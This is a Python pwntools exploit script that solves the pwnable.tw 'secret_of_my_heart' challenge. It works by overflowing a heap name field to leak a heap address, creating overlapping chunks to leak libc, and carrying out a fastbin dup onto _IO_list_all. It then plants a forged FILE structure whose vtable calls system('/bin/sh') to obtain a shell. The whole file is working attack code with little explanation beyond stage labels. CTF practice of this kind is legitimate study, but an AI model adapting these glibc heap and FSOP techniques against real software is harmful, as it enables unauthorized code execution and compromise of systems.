```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./secret_of_my_heart_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe

r = 0
debug = 0


if args.LOCAL:
    r = process([exe.path])
    if debug==1:
        gdb.attach(r, gdbscript='''
            start
            ''')
    #input()
else:
    r = remote("chall.pwnable.tw", 10302)


def add_secret(size, name, secret):
    r.sendlineafter(b"Your choice :", b"1")
    r.sendlineafter(b"of heart :", f"{size}".encode())
    r.sendafter(b"Name of heart :", name)
    r.sendafter(b"secret of my heart :", secret)


def show_secret(index):
    r.sendlineafter(b"Your choice :", b"2")
    r.sendlineafter(b"Index :", f"{index}".encode())

def del_secret(index):
    r.sendlineafter(b"Your choice :", b"3")
    r.sendlineafter(b"Index :", f"{index}".encode())




    



def main():

    ## Stage 1: Leak heap
    add_secret(0x18, b"A"*32, b"A") # index 0
    show_secret(0)
    r.recvuntil(b"Name : " + b"A"*32)
    chunk_0 = u64(r.recv(6).ljust(8, b"\x00"))
    print("[*] chunk 0: ", hex(chunk_0))

    ## Stage 2: Leak libc

    # prepare
    add_secret(0x18, b"index 1", b"A") # index 1
    add_secret(0x100-8, b"index 2", b"A") # index 2
    add_secret(0x18, b"index 3", b"/bin/sh\x00") # index 3


    # set up for final step
    add_secret(0x70-8, b"index 4", b"A") # index 4
    add_secret(0x100-8, b"index 5", b"A") # index 5
    add_secret(0x70-8, b"index 6", b"A") # index 6, nvm


    del_secret(4) # free index 4
    payload = p64(chunk_0+0x160-0x10)*2
    payload = payload.ljust(0x60, b"\x00")
    payload += p64(0x70)

    add_secret(0x70-8, b"index 4", payload) # still index 4
    del_secret(5) # Consolidate backward --> new size: 0x170 (index 5 is now FREE)


    add_secret(0x70-8, b"index 5", b"A") # index 5 (pointer at index 5 = pointer at index 4)
    add_secret(0x100-8, b"index 7", b"A") # index 7, clear unsorted bin

    # end for [ set up for final step ]





    del_secret(1) # free(chunk 1)
    add_secret(0x18, b"index 1", p64(chunk_0+0x20-0x10)+p64(chunk_0+0x20-0x10)+p64(0x20)) # still index 1

    del_secret(2) # Consolidate backward --> new size: 0x120 (index 2 is now FREE)


    # leak libc
    show_secret(1)
    r.recvuntil(b"Secret : ")
    unsorted_bin = u64(r.recv(6).ljust(8, b"\x00"))
    print("[*] unsorted_bin: ", hex(unsorted_bin))

    libc.address = unsorted_bin-0x3c3b78
    print("[*] libc: ", hex(libc.address))


    ## Stage 3: Fastbin dup and FSOP

    IO_list_all = libc.sym['_IO_list_all']


    print("[*] _IO_list_all", hex(IO_list_all))






    del_secret(4) # index 4 is now FREE
    del_secret(6) # index 6 is now FREE
    del_secret(5) # index 5 is now FREE
    # fastbin of 0x70 -> index 5 -> index 6 ->  index 4 (index 4 = index 5)



    ## FSOP
    fp = chunk_0+0x20


    vtable = chunk_0+0xe8
    my_fsop = b"/bin/sh\x00"+p64(0)
    my_fsop += p64(0)
    my_fsop += p64(0)
    my_fsop += p64(1)+p64(2)
    my_fsop = my_fsop.ljust(0xc0, b"\x00")
    my_fsop += b"\x00"*24
    my_fsop += p64(vtable)
    my_fsop += p64(libc.sym['system'])
    add_secret(0x100, b"index 2 new", my_fsop)


    target = IO_list_all-0x23
    add_secret(0x70-8, b"A", p64(target))
    add_secret(0x70-8, b"A", b"A")
    add_secret(0x70-8, b"A", b"A")


    add_secret(0x70-8, b"win", b"\x00"*0x13+p64(fp))



    r.sendlineafter(b"Your choice :", b"4")
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```
